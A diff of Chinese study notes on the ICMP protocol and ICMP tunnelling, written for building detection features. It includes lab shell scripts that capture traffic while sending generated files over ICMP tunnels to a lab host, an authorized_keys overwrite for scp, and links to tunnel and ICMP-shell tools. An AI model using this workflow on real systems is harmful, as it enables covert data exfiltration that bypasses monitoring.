@@ -1,5 +1,26 @@
 # ICMP
 
+## ICMP概念
+
+ICMP协议即网际控制报文协议（Internet Control Message Protocol，ICMP），运行于IP协议之上，但通常被认为是IP协议的一部分。
+其中文实际含义是是“差错与控制协议”。ICMP协议的主要功能是： 
+1. 传输差错信息
+2. 传输控制信息 
+
+ICMP报文也是封装在IP数据报的数据部分中进行传输的，ICMP软件只是作为IP软件的一个模块而存在。
+
+### ICMP作为单独的一层吗？
+
+虽然ICMP报文由IP数据报传输，但我们并不把ICMP看作比IP更高层的协议。事实上，ICMP报文的信宿总是信宿机上的IP软件，。IP软件一旦接收到差错或控制报文，立即交给ICMP模块进行处理。在这种意义上，我们也可以把ICMP看作不同机器的IP软件间相互通信的机制。 
+在协议层次结构中，ICMP的差错和控制信息传输在概念上并不构成一个独立的层次，它不是一种具有普遍意义的传输机制，不是上层协议赖以存在的基础，而只解决了Internet中的一类特殊问题，所以不能独立出来。 
+
+![](pic/ICMP6.png)
+
+![](pic/ICMP7.png)
+
+代码（Code）字段，长度是1字节，表示发送这个特定报文类型的原因。 
+校验和（Checksum）字段，长度是2字节，用于数据报传输过程中的差错控制。ICMP地校验和计算与IP报头的校验和类似，都是采用反码算术运算。
+
 
 ## ICMP隧道
 
@@ -17,12 +38,9 @@
 
 ![1](pic/ICMP1.png)
 
-文件传输
+实际使用场景主要有：
 
-
-
-Web访问
-
+文件传输、IP隧道（web）、SSH连接
 
 
 
@@ -39,17 +57,8 @@ Web访问
 #### 可用信标
 
 - 单位时间内的ICMP请求数量、响应数量
-
-
 - 单位时间内的ICMP消息平均长度
-
-
 - 响应数据包中 payload 跟请求数据包不一致的 ICMP 数据包数量
-
-
-- ICMP 数据包的协议标签（工具加入的特征）
-
-
 
 #### 测试过程
 
@@ -62,64 +71,83 @@ tcpdump -i ens33 -t -s 0 -w ./target.cap & curl www.baidu.com & curl www.acfun.c
 sleep 10
 kill `ps aux | grep tcpdump | grep -v grep | awk '{print $2}'`
 ```
-
 ![2](pic/ICMP2.png)
 
-
-
-- 单位时间内，所有请求消息的消息数量**（$\_###\_req\_msg\_num）**，以及所有响应消息的消息平均数量**（$\_###\_resp\_msg\_num）**
-- 单位时间内，所有请求消息的Data平均长度**（$\_###\_req\_msg\_length）**，以及所有响应消息的Data平均长度**（$\_###\_resp\_msg\_length）**
-- 单位时间内，响应数据包中 payload 跟请求数据包不一致的 ICMP 数据包数量**（$\_###\_diff\_msg\_num）**。
-- ICMP 数据包的协议标签 **（$\_###\_msg\_tag）**
+- 单位时间内，所有请求消息的消息数量**`（$\_###\_req\_msg\_num）`**，以及所有响应消息的消息平均数量**`（$\_###\_resp\_msg\_num）`**
+- 单位时间内，所有请求消息的Data平均长度**`（$\_###\_req\_msg\_length）`**，以及所有响应消息的Data平均长度**`（$\_###\_resp\_msg\_length）`**
+- 单位时间内，响应数据包中 payload 跟请求数据包不一致的 ICMP 数据包数量**`（$\_###\_diff\_msg\_num）`**。
+-   ICMP 数据包的协议标签 **`（$\_###\_msg\_tag）`**
 
 
 
 
 ### DNS正常与异常数据流量自动化生成与捕获
 
-#### 文件传输
+#### 场景一 web访问
 
-icmp_transmitter
+1、icmp隧道异常流量生成
 
-https://github.com/NotSoSecure/icmp_tunnel_ex_filtrate
-
-|name|description|
-|-|-----|
-|被攻击服务器|192.168.1.101|
-|攻击者服务器|192.168.1.120|
-|传输文件|*.icmp.log|
-
-#### 操作：
-
-生成传输文件：
+1)爬取 http://top.chinaz.com/all/index.html 中的网站，用来作为网站访问产生icmp请求流量，得到URL列表urllist.txt
 
 ```python
-import random
-import string
+# encoding: UTF-8
+# top.chinaz.com.py
+import requests
 import sys
-
-prefix = sys.argv[-1] if len(sys.argv) == 2 else "test"
-
-for i in range(30):
-    name = ''.join(random.sample(string.ascii_lowercase, 5))
-    f = open("{}.{}.log".format(name, prefix), 'a')
-    f.write("".join(random.sample(string.ascii_letters+string.digits, 62)))
-    f.close()
+import re
+url =  "http://top.chinaz.com/all/index.html"
+try:
+    r=requests.get(url)
+    pattern = re.compile(r'<span class="col-gray">([a-z.0-9]*?)</span>')
+    match = pattern.findall(r.text)
+    if match:
+        print "crawl success."
+    with open("urllist.txt", 'w') as f:
+        for value in match:
+            f.write(value+"\n")
+ 
+except Exception as e:
+    print "web request failed."
+    print e
 ```
+2)使用icmptunnel开启隧道.
 
+3)使用./curl_batch.sh 产生web访问流量及pcap包。
 
-#### Web访问
+```bash
+#!/bin/bash
+# curl_batch.sh
+cat urls.txt | while read myline
+do
+    echo "[*] processing: ${myline}"
+    tcpdump -i ens33 -w $myline.pcap &
+    curl $myline &
+    sleep 1s
+    ps aux | grep tcpdump | grep -v grep | awk '{print $2}' | sudo xargs kill
+done
+```
+2、正常流量
+urllist.txt同上
 
-#### 生成被传输文件：
+不开启icmp隧道情况下，执行./curl_batch.sh 即产生正常流量及pcap包。
+
+#### 场景二 文件传输
+
+1、异常流量生成
+
+1）生成被传输文件：
+
+执行python create.py icmp
 
 ```python
 #log文件生成
+#create_log.py
 import random
 import string
 import sys
- 
+  
 prefix = sys.argv[-1] if len(sys.argv) == 2 else "test"
- 
+  
 for i in range(30):
     name = ''.join(random.sample(string.ascii_lowercase, 5))
     f = open("{}.{}.log".format(name, prefix), 'a')
@@ -127,7 +155,46 @@ for i in range(30):
     f.close()
 ```
 
-#### ssh认证
+2）准备icmp_transmitter.py文件（其中main处做了修改，以适合linux环境）
+
+3）传输文件、打包Pcap
+
+执行./icmp_trans.sh
+
+```bash
+#!/bin/bash
+# icmp_trans.sh
+for i in $(find -name "*.log")
+do
+    echo "[*] processing: ${i##*/}"
+    while true
+    do
+        echo ${i##*/}
+        tcpdump -i ens33 icmp -w $i.pcap &
+        python icmp_transmitter.py ${i##*/} 192.168.1.108
+        if [ $? -eq 0 ]; then
+             sleep 1s
+             ps aux | grep tcpdump | grep -v grep | awk '{print $2}' | sudo xargs kill
+             break
+        fi
+    done
+done
+```
+
+2、正常流量
+
+无
+
+#### 场景三 文件传输
+
+
+1、异常流量生成
+
+1)生成传输文件
+
+执行python create.py icmp
+
+2)ssh认证
 
 scp传输前需要先做好ssh认证，不然要一直输入密码
 
@@ -139,34 +206,34 @@ scp传输前需要先做好ssh认证，不然要一直输入密码
 
 `scp ~/.ssh/id_rsa.pub 192.168.100.4:/root/.ssh/authorized_keys`
 
-#### 传输文件、打包Pcap
+3)开启icmp隧道
+
+4)传输文件、打包Pcap
 
 ```bash
-#传输文件、打包Pcap
-
-#!/bin/sh
-
-for i in $(find log/ -name "*.log")
+#!/bin/bash
+# icmp_trans.sh
+for i in $(find -name "*.log")
 do
     echo "[*] processing: ${i##*/}"
     while true
     do
-        nohup tcpdump -i ens33 -w $i.pcap &
+        echo ${i##*/}
+        tcpdump -i ens33 icmp -w $i.pcap &
         scp -C $i root@192.168.1.118:/root/pcap/icmp/
-        curl "www.taobao.com"
         if [ $? -eq 0 ]; then
-            break
+             sleep 1s
+             ps aux | grep tcpdump | grep -v grep | awk '{print $2}' | sudo xargs kill
+             break
         fi
-        ps aux | grep tcpdump | grep -v grep | awk '{print $2}' | sudo xargs kill -9
     done
 done
-ps aux | grep tcpdump | grep -v grep | awk '{print $2}' | sudo xargs kill -9
 ```
 
 
-### 工具
+## 工具
 
-#### icmptunnel
+### icmptunnel
 
 Transparently tunnel your IP traffic through ICMP echo and reply packets.
 
@@ -275,7 +342,7 @@ target.cap包如下，可以看到数据内容包含在icmp包Data中
 ![](pic/ICMP4.png)
 
 
-#### Data Ex-filteration over ICMP Tunnel
+### Data Ex-filteration over ICMP Tunnel
 
 https://github.com/NotSoSecure/icmp_tunnel_ex_filtrate
 
@@ -303,9 +370,9 @@ base64解码
 `certutil -decode "base_64_encoded_textfile" "file.extention"`
 
 
-#### ptunnel
+### ptunnel
 
-官网：http://www.mit.edu/afs.new/sipb/user/golem/tmp/ptunnel-0.61.orig/web/
+官网：http://www.cs.uit.no/~daniels/PingTunnel/
 
 下载：http://www.cs.uit.no/~daniels/PingTunnel/PingTunnel-0.72.tar.gz
 
@@ -327,16 +394,15 @@ base64解码
 
 
 
-
-
-
-
-#### icmpsh
+### icmpsh
 
 https://github.com/inquisb/icmpsh
 
 
 
+### Hping3
+
+https://github.com/antirez/hping
 
 
 
@@ -385,3 +451,7 @@ https://klionsec.github.io/2017/10/31/icmp-tunnel/
 dpkt Tutorial #1: ICMP Echo
 
 https://bbs.pediy.com/thread-213074.htm
+
+Internet Control Message Protocol (ICMP) Parameters
+
+https://www.iana.org/assignments/icmp-parameters/icmp-parameters.xhtml
